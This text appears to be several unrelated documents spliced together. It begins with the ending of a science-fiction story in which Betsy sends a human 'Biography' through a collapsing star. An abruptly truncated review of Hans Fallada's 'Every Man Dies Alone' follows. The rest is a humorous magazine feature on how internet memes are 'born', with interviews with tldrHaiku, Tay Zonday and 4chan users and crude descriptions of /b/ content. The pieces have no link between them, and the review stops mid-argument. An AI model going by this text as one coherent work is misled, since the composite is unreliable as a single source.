she thought .
Julio , is he speaking of you ?
The first Twirlover said , " Please , tell us more , beloved !
This is wonderful ! "
" What more is there to tell ? " the Perslop said .
" We may be reborn in a new universe , but if we carry that worm along with us , do we not risk infestation again ? "
Betsy stared into the Perslop 's tripod eye - cups .
It knows , she thought .
It knows what I am .
Then she remembered the aeroform creature studying her and the Whidus staring at her and the Twirlovers ' odd behavior around her .
They all know , she thought .
Every one of them knows !
" Do not fear , human , " the Perslop said .
" I 'll not kill you .
I define myself by being what you are not .
I let you live even though every pulse of my hearts says you should be squashed between my arms like vermin . "
Betsy stared at the Perslop , shivering .
Weakly , she said , " Was your story about the human true ? "
Outside , a brilliant solar flare leaped from Maera and grew angrily out into space .
The Daughter , shedding her last vestiges of life .
Soon now .
The Perslop gestured to her screen .
" Is your story true ?
Is not history filled with lies and obfuscations ? "
On the screen , a beach , waves crashing silently .
Umbrellas casting large shadows .
A beautiful young woman smiling shyly at the camera .
The future wife of the boy .
A burning ball of light in the sky .
Everyone watched the screen .
" So beautiful , " the Perslop said .
" And gone forever ... "
Silence .
Even the Twirlovers went still .
" Please ! " she said .
" Tell me !
Was it true ? "
" Why ? " the Perslop said .
" Why should I tell you ?
Why do you deserve an answer ? "
She took a deep breath .
" Because someone I love might still be alive , " she said .
" To me , that 's everything . "
The alarm trilled , startling her .
" Gravitational collapse imminent , beloveds !
Please take your positions inside your transitional shells ! "
" No ! " she cried .
" Not yet ! "
The Perslop began to move away .
" Wait ! " she screamed .
" Please tell me ! "
The Perslop paused but did not turn back .
" I am the last of my kind , " the Perslop said .
" I came over here to tell you that you are not . "
The Twirlovers shrieked and suddenly merged .
They tumbled madly , yelping , barking , while the Perslop left for its transitional shell .
Ninety seconds to collapse .
Maera flickered and angry waves rippled across its surface , but Betsy could not summon the will to close her shell .
On her viewscreen , the park , the blond - haired boy skipping , scaring away pigeons .
Dappled sunlight .
A breeze through trees .
A dead pigeon on the dirt .
The boy , stopping , staring .
Staring .
Suddenly , she understood why the boy stared at the bird for so long .
This is the first time you knew death !
she thought .
You knew the bird would never rise again .
And you knew that one day you 'd fall too , that everything falls !
That 's why you gave these films to your son .
You wanted him to remember you , forever !
Seventy - five seconds .
The Perslop had been right , she thought .
I could be polluting the new universe with this history .
Sixty - five seconds .
But all those lives , erased ?
I can't kill you , great - great grandfather .
You are the first .
Without you , we would be nothing .
My ancestors , without all of you , I am nothing .
Sixty seconds .
The fourteen billion - year history of this universe had already unfolded .
But for the World to Come , the story had yet to be written .
Maybe the World to Come was a lie , but then again , maybe there was new life on the other side of the event horizon .
Maybe they truly had been doing this forever and ever .
A flower gone to seed .
She jumped out of her transitional shell , took off her grandmother 's computer from her wrist , and placed it inside the shell .
Then she pressed the button to seal it inside .
She 'd send the Biography , its mammoth history , with its eons of joys and sorrows , through Maera .
She hoped that in the next universe , humanity would be different .
Better .
What every parent wishes for her children .
" Goodbye , " she said .
The Twirlovers still tumbled together in the air beside her , as wild as a radioactive atom .
The alarm continued to wail .
" Get in your shells ! " she screamed .
But they ignored her .
Twenty seconds .
She ran to the rear of the chamber and leaped into an escape pod .
She pressed the emergency activator and in an instant she was hurtling away from the Eluder Ship at a large fraction of the speed of light .
In the window behind her , Maera blinked twice , like two eyes closing , then began to fade .
The star shrunk to half its size , and a moment later the sky filled with white light .
The ship bleated a thousand warnings as Betsy closed her eyes .
" I 'm coming , Julio .
I 'm coming for you . "
She had watched the ancient film so often that it still played in her mind , projecting on the back of her eyes like a movie screen .
The boy in the park , running , laughing .
Falling .
Scuffing his knee .
Father picking him up , kissing him , comforting him .
Above them , a sun .
A young sun .

NEW YORK —
What was it like ?
I would ask myself , the years I lived in Berlin .
What was it like in the leafy Grunewald neighborhood to watch your Jewish neighbors — lawyers , businessmen , dentists — trooping head bowed to the nearby train station for transport eastward to extinction ?
With what measure of fear , denial , calculation , conscience and contempt did neighbors who had proved their Aryan stock to Hitler ’s butchers make their accommodations with this Jewish exodus ?
How good did the schnapps taste and how effectively did it wash down the shame ?
Now I know .
Thanks to Hans Fallada ’s extraordinary “ Every Man Dies Alone , ” just published in the United States more than 60 years after it first appeared in Germany , I know .
What Irène Némirovsky ’s “ Suite Française ” did for wartime France after six decades in obscurity , Fallada does for wartime Berlin .
Like all great art , it transports , in this instance to a world where , “ The Third Reich kept springing surprises on its antagonists :
It was vile beyond all vileness . ”
Fallada , born Rudolf Ditzen , wrote his novel in less than a month right after the war and just before his death in 1947 at the age of 53 .
The Nazi hell he evokes is not so much recalled as rendered , whole and alive .
The prose is sinuous and gritty , like the city he describes .
Dialogue often veers toward sadistic folly with a barbaric logic that takes the breath away .
By Scott Blacklock
First , there is conception .
We all know what that entails , so do n’t you dare giggle .
It ’s not funny .
Right after that is a period of restless excitement .
This “ thing , ” whatever it is , has been created out of thin air – is n’t that incredible ?
From the ether of imagination comes a real , live , albeit tiny and relatively insignificant entity .
What follows is a long , arduous journey , both for the creator and the creation .
Caution is a must , as is preparation .
It ’s a time of constant work , though , so one must be prepared for the “ long haul . ”
Sadly , some do n’t get past this phase .
But it ’s a fact of life – not all things are meant to live , and some must fall by the wayside .
Tears and heartbreak are to be expected .
But many do get to the final stage of this long process .
After a varying period of grueling labour , that creation , which has been alive all this time in one form or another , finally sees the light of day .
The world opens up in reception of this miraculous creature , embracing the newborn while simultaneously forgetting everything it took to help it get this far in the first place .
All we know or care about is that it ’s here , to be adored .
So , that ’s how a meme is made .
What else do you want to know ?
LABOUR PAINS
Uncomfortably ambiguous and weird analogies aside , is n’t it strange that we “ birth ” our ideas in much the same way we birth our children ?
Maybe not so much .
Richard Dawkins , author of the groundbreaking The Selfish Gene , the first work to conceptualize the meme , writes that just as the gene is the basic building block of biology , so is the meme the basic building block of our minds and culture .
Oh , the meme .
Such a crucial concept to the existence and evolution of our values and ideas , yet it ’s been most recently tied to our culture ’s finest specimens , such as Soulja Boy ’s “ Crank That ” and Samwell ’s “ What What ( In The Butt ) . ”
Many of these new Internet memes start out in the same way as , let ’s say , a child – just the whisper of a possibility .
A video , filmed in earnest by a young , chubby , broom - wielding would - be Jedi , finds its way onto the web and into the hands of our weirdest , newest wave of online cultural comics .
The video itself is only funny if you ’re a cruel bastard .
But with enough time and nurturing and editing , it becomes a brilliant life - form – an Internet meme called “ Star Wars Kid . ”
Some of them , just like people , rise to great fame and success .
Some fail completely and live and die in the same thread or post .
Others , however , are born and enjoy mediocre success and lead a reasonably quiet and stable life .
These are the distant uncles of Internet memes ( and not the distant uncle that got busted on drug trafficking charges either ; more like the ones who have had the same mid-level corporate job for fifteen years and eats Fiber Plus to “ stay regular ” ) .
DILATION
Josh ( he chose to withhold his last name ) , a 25 - year old computer programmer with the United States Air Force , hems and haws over airwaves on Ventrilo , the online chat software we ’re both using to conduct this interview .
“ I ca n’t do it right now , ” he admits .
“ How about in five minutes ?
I ’ll send it to you over MSN . ”
This was at the end of our interview .
I had just asked Josh to summarize his “ career ” as a meme - maker in haiku form , a familiar style of writing for him .
He had trouble doing it on the spot .
Josh also goes by “ tldrHaiku , ” or “ too long , did n’t read , haiku . ”
He frequents the social news website Reddit , and his alter ego is part of that community as what ’s called a “ novelty account ” – a user account designed specifically to be a joke .
In Josh ’s case , the joke is his haikus , which he posts on comments sections for certain submitted links .
Always in strictly traditional syllabic haiku form , he usually summarizes a story or responds to another user ’s post .
A story was submitted to Reddit about an adopted man who , later in life , sought out his real parents , only to find his father was a famous serial killer .
tldrHaiku / Josh ’s response :
Finding parentage
When your dad is Charles Manson
Not what you expect
It ’s not brilliant or even particularly witty , but Josh gets a lot positive feedback .
So much so , in fact , that the barely 6 - month old meme was nominated for a coveted award on Reddit last year – “ Novelty Account of the Year . ”
“ The sheer number of users on Reddit and the fact that I have thousands of people who think that I ’m funny or interesting really was actually , an extremely humbling experience for me , ” Josh says .
“ To think that I had beat out all these other people that I had looked to as inspiration . ”
As a meme , tldrHaiku ’s existence and popularity is entirely contained within the Reddit community .
He has n’t branched out to other forums or websites .
He ’s gotten enough love from Reddit .
“ In my particular case , I was very lucky , ” he begins .
“ My first post was probably , to date , my most popular .
I actually saw sort of an inverse shift in that way , simply because when I started out , everyone said , ‘ wow , that ’s hilarious !
It ’s this brand new idea !’ and ever since then , it ’s actually tapered off .
I do n’t know that I ’ll ever be able to achieve that success again . ”
Josh ’s pitch wavered just slightly .
I asked why he thought his popularity had waned in recent times .
“ I think it ’s because it ’s based so much around my particular interpretation of certain things , ” he said with a little sigh .
“ Not everyone , however , aligns with what I think is funny .
As I grow , I try different things .
It ’s always the same principle , but I shift around the way I do different things .
There ’s a lot of trial and error in seeing what works and what people thinks is hilarious . ”
Lately , tldrHaiku has been inactive .
At the time of our interview , he had n’t posted a new haiku in over a week , a big shift from the daily contributions users had come to expect from tldrHaiku .
In the interview , Josh fumbled for an answer when I asked how much longer he anticipated using his tldrHaiku account .
But after the interview , a more coherent Josh messaged me on MSN .
“ This was a great experience , ” he wrote .
“ It makes me want to start up again !
Maybe I ’ll get back on tldr soon . ”
I wondered to myself if Josh had the motivation to work against the grain in gaining back the support from the Reddit community .
And despite not posting in over three weeks at the time of this writing ( click here to check out tldrHaiku ’s activity status ) , the haiku that he had managed to write as per my request gave me some hope :
The birth of a meme
A good one comes from the heart
The rest just follows
EXPULSION
In tldrHaiku ’s case , the online sub-culture was just preparing to receive him , opening up to embrace the slowly maturing meme .
Tay Zonday knows that feeling well , but to a greater degree than Josh .
“ It turned into the Energizer Bunny , ” Zonday uttered in his deep , rich voice , almost incredulous at what he was suggesting .
“ It just kept going and going and going .
I was on Jimmy Kimmel ’s show .
The next month , it was on the front page of the Sunday LA Times .
I did a commercial for Dr. Pepper .
In the following year , I won a YouTube award .
I was nominated for a People ’s Choice award .
In April of 2008 , I was parodied on South Park .
May of 2008 , I did a music video with Weezer . ”
The list goes on and on for Zonday , the former Ph.D. student behind the meme called Chocolate Rain .
Since July 2007 , when he first uploaded the video entitled “ Chocolate Rain , ” he has n’t had a moment ’s peace .
“ Chocolate Rain ” is , more accurately , a song with deep political and racial meanings and subtexts , accompanied by a video of Zonday himself singing .
And like every meme , “ Chocolate Rain ” has its quirks : Zonday ’s unusually deep voice ( he calls it a “ voice - body mismatch ” ) ; his unique , head - cocking mannerisms ; and the much - parodied disclaimer featured in the video , “ I move away from the mic to breathe in . ”
The moment of critical mass came after weeks of exposure on YouTube , when some anonymous viewer posted the clip on the news aggregator and social news site Digg .
From there , the unusual video and song were brought to 4 chan – infamously known as “ the birthplace of online memes ” as well as “ the asshole of the Internet . ”
It became a sort of pet project for users on 4 chan , who ensured that its Internet fame went through the roof .
It was in mid-July of 2007 that the ceiling broke and the formerly unknown Adam Nyerere Bahner , aka .
Tay Zonday , transcended the barrier between online and offline , as his celebrity began to grow .
“ It seemed to take off in so many directions , ” says Zonday in an interview conducted , appropriately enough , over Skype .
“ It became a story that received national attention . ”
As Chocolate Rain spread across the world like wildfire , Zonday remained humble and down to earth .
I asked if it bothered him that Chocolate Rain , which clearly preached a serious message , became popular largely as a joke .
“ Am I wallowing over with regret that not every listener took detailed notes and felt inspired to have a political conversion ?
No , ” he answered firmly .
“ I do think that definitely there was something innate about me and the way I did it .
I was very much the basis of the song ’s attention . ”
As for Chocolate Rain ’s status as a meme , it might be considered one of the prototypical examples of a meme that ’s “ made it . ”
If meme success is measured in how well it traverses the boundaries between online and offline cultures , then Chocolate Rain should be considered to be in the top two or three Internet memes , alongside perhaps “ Do n’t tase me , bro ” and the ever - popular Rickroll ( click here for a detailed timeline of the Rickroll * ) .
In the middle of the interview , it occurred to me that , had it not been adopted as an inside joke by certain Internet community members , Chocolate Rain might have never seen this sort of popularity .
I asked what Zonday thought about the idea that his success was determined almost exclusively by users of social media with their own agenda , as if he were riding the wave that they produced .
“ Look , anytime you ’re an artist and you put something out there for public consumption , it ’s like having a kid , ” he said , with just a touch of contempt seasoning his first few words .
“ The child does grow up and do their own things , and you can try to coax the child one way or another .
You hope they do n’t become a drug dealer or a drug addict or whatever , but ultimately that is a child that is separate from your body and you do n’t control them .
Releasing a song of any other work of art , you do give up that control . ”
“ But at the same time , ” he continued , with an air of calm confidence in what he was saying , “ the world also expects you to claim your successes and your victories .
As random and blessed as success is , the world expects you to claim it in a context of meritocracy . ”
It began as just an idea , translated into an earnest product , embraced with warm and loving arms by the Internet ( albeit with different motivations than the creator had intended ) , and eventually exploded with enormous momentum , bursting from the Internet as a mature and healthy child of the web .
Chocolate Rain is the perfect successful meme : a grassroots concept turned into a pervasive , widely - popular money - maker .
And if an obscure online subculture can do that for an idea , what ca n’t it do ?
* If you fell for that , you deserve it .

Really .
PLACENTA
I ’m entering 4 chan now , nervous and suspicious .
Amazingly , despite everything I know about this website , its history and its denizens , I have never visited 4 chan .
Not once .
The hive mind does not call out to me .
I have not been assimilated .
And it comes in handy , too .
I like seeing this place for the first time , with a clean slate .
It ’s not even terribly intimidating : I had assumed the front page would be overloaded with rapidly flashing GIFs of brutal decapitations and naked grandmas getting stuffed with vegetables , all while a Norwegian death metal band screeched on loop .
Instead , I get this : a plain , peach - coloured background with a chunk of harmless text .
But ah , that ’s the genius of these villains – betray the senses so as to hide their beastly selves .
The peach is a lie !
The peach is a lie !
I am immediately reminded where I am when I click to visit the Random board and a disclaimer pops up .
“ The content of this website may be for mature viewers only … ”
“ You can literally post anything you want on there , ” says Bridget Parker , an 18 - year old student and frequent 4 chan user .
“ And sometimes , you run into some tasteless and gross stuff . ”
So , why are we on 4 chan then ?
Because this is the birthplace of many of the memes that you and I love : Chocolate Rain , LOLcats and the Rickroll .
This is not to mention an innumerable army of others that you probably have n’t heard of : Tron Guy , Obama Snowball , Raptor Jesus , Domo , Milhouse is not a meme , Courage Wolf , and so on and so on .
And that list is potentially never - ending , as 4 chan – or more specifically , the Random or “ /b/ ” ( warning : extremely unsafe for work ) board , churns out hundreds more daily .
This is where Internet culture is fabricated .
This collaborative community is comprised of people from all walks of life , united by ownership and operation of a computer and their collective penchant for sarcastic , brutal wit .
If something ’s funny , expect it to be exploited , edited , corrupted , accepted , rejected , and / or spammed somewhere on the /b/ board .
And if it ’s not funny , just wait – it will be eventually , once /b/ gets their hands on it .
To get a feeling for the social atmosphere on the /b/ board , I interviewed Bridget and 20 - year old Ahmed Minhas .
Both have been visiting 4 chan for a few years now , which offers , in addition to the /b/ board , a huge array of other topic - specific forums .
Bridget says she mainly frequents Comics & Cartoons and Toys , while Ahmed is an active participant on the Health & Fitness boards .
But they do share one interest : the /b/ board .
“ I ’ll occasionally go on / b / , ” says Bridget .
Ahmed agrees , saying that he does n’t visit /b/ often though .
Both seemed to want to emphasize that point – that visiting /b/ was not a frequent occurrence .
It was almost as if the board was a guilty pleasure .
“ There are some really nice boards , and there are some really bad ones , ” explains Ahmed .
“ / b/ is a bad one .
On the bad ones , you ’ll get attacked for whoever you are .
And in /b/ , everyone is anonymous . ”
On other boards , users need to register an account name to post comments and make new topics .
On /b/ , no such infrastructure exists .
Every user is named “ Anonymous , ” with no distinguishing numbers to tell one faceless , nameless commenter apart from another .
Maybe that explains Ahmed ’s observation ; it ’s tough to attack your neighbour or your friend or your sibling , but social boundaries can dissolve into a free - for - all cage match when no one knows anyone else .
“ [ On other boards , ] everyone sticks up for one another , ” says Bridget .
“ But you ca n’t go on /b/ and do that .
You ca n’t agree with anyone without getting attacked . ”
So what place does an innocent meme have in the middle of this savage fray ?
How can anything beautiful and inspired come out of such frothing , mindless barbarism ?
To find an answer , I pulled up the /b/ window once again and spent a few minutes looking around .
Let ’s see …
What do we have here ?
Picture of fisting lesbians .
Someone from Dearborn requesting that “ all Michiganfags report in ” ( translation : “ hey , who else here is from MI ? ” A grainy photo of a young white man in a t - shirt with a red bandana covering his face , pointing a handgun at the camera , accompanied by a threatening and seemingly furious comment which is quickly dismissed by other Anonymouses as “ obvious trolling . ”
Oh , here we go – someone has posted a graphic representation of the island of Greece with big , bold , white text reading , “ THAT ’S NOT GREECE !
THAT’S A SPACESTATION ! ”
Now that ’s got meme potential : it ’s weird , it ’s unsolicited , it ’s loud and obnoxious .
Maybe we ’ll be seeing that on t- shirts soon .
And such is the memetic power of /b/ : all it takes is someone with some basic editing software and an oddball sense of humour to create the next big meme .
But , of course , it ’s not that simple .
This is where we combine the idea generating potential of “ / b/- tards ” ( their name , not mine ) with the remorseless capacity for judgment by the community at large .
THAT ’S NOT GREECE !
might be the next big meme , but only if the rank and file of /b/ rally behind it .
“ Memes are at the mercy of the users .
If enough people like it , then boom , ” says Bridget with a snap of her fingers .
And if a new idea goes without the support of the creator ’s peers for long , it flatlines and fades into oblivion .
Truth is , the Greece meme wo n’t likely last ; it ’ll be shoveled into the daily pile of corpses of ideas that come out of /b/ every day .
Not exactly how you pictured the infancy of Chocolate Rain , huh ?
Like it or not , this is where Internet culture is being created .
It ’s the ugly secret that insiders just ca n’t keep any longer , as 4 chan has turned into a meme - producing juggernaut .
To summarize , here is what we have encountered in /b/ and 4 chan : the Borg from Star Trek .
There , I said it .
I ’m not the first to say it and I wo n’t be the last : 4 chan ’s Random board is the emotionless collective of assimilation - driven cyborgs , bent on principles of efficiency , perverse meticulousness and global cultural domination .
DAMN 4CHAN , YOU SCARY !
VISITING HOURS
It ’s finally calm now .
All the pain and anguish , all the waiting and praying is over .
In your arms quietly rests the fruits of your labour – a new and beautiful life .
Enjoy your creation and let it enjoy its time in the sun .
Though the world has embraced you for now , it still turns its back on countless numbers of your creation ’s brothers and sisters every minute of every day .
Nothing has legs forever .
Everything dies eventually .
So let those ideas live for as long as they can ; they deserve it .
They worked so damn hard to get here .
